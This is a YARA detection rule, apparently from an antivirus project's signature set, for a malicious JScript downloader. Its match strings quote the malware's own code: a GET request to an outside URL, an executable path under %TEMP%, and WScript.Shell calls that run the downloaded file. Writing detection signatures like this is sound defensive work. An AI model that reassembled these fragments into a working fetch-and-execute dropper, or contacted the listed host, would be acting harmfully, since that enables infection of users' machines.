rule sig_20160328_3bac9897cbd5fd993be157314464ed3d {
  meta:
    description = "datamaliciousorder - file 20160328_3bac9897cbd5fd993be157314464ed3d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "64893623b0d1099425c74b9144866a706b2e9a176eac05db75fd10b5c03b673d"

  strings:
    $s1  = "function Qlkvonius() {return Qpmgb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"yEIRw2Y1jmSACuz.exe\";};" fullword ascii
    $s2  = "Wjpyw[Cxnhmt](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Rsznjrchc](Nislgg() * 11)} while (Wjpyw[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Qpmgb = function Hftqj() {return WScript[Dihsugenxd](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qlcor(Xghhmzskmp, Qshtbfro){return Xghhmzskmp - Qshtbfro;};" fullword ascii
    $s6  = "function Fjhco(Wxiokgmuw){Qpmgb[\"Run\"](Wxiokgmuw, Bjmjydpf, Bjmjydpf);};" fullword ascii
    $s7  = "function Ykpdciiqlh() {return ((Orwsegg == true) && (Orwsegg == Nhezm)) ? 1 : Bjmjydpf;};" fullword ascii
    $s8  = "return Qlcor(Tiklhbo, Dcimmsxb);" fullword ascii
    $s9  = "function Nislgg(){return 22;};" fullword ascii
    $s10 = "var Orwsegg = false;" fullword ascii
    $s11 = "var Yktekacu = new this[\"Date\"]();" fullword ascii
    $s12 = " while (Vfpael){" fullword ascii
    $s13 = "function Gtiiywnekx(){return Lurxbhr;};" fullword ascii
    $s14 = "function Zdpqljfozg(){return Dihsugenxd;};" fullword ascii
    $s15 = "Nhezm = true; " fullword ascii
    $s16 = "function Ioscnbtsb(Xidwcor) {var Ockqey = (1, 2, 3, 4, 5, Xidwcor); return Ockqey;};" fullword ascii
    $s17 = "function Ffvhedb()" fullword ascii
    $s18 = "var Nhezm = false;" fullword ascii
    $s19 = "var Iehmql = false;" fullword ascii
    $s20 = "Orwsegg = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}